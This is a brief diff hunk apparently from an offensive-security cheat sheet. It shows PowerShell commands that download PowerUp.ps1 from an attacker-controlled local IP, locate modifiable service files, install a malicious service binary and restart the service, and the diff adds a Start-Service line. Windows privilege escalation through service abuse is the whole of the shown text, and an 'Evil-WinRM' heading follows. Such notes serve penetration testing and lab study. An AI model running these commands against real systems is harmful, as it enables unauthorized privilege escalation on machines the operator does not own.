@@ -48,6 +48,7 @@ iwr -uri http://$LOCAL_IP/PowerUp.ps1 -Outfile PowerUp.ps1
 Get-ModifiableServiceFile
 Install-ServiceBinary -Name '$SERVICE'
 Restart-Service $SERVICE
+Start-Service $SERVICE
 ```
 
 Evil-WinRM:
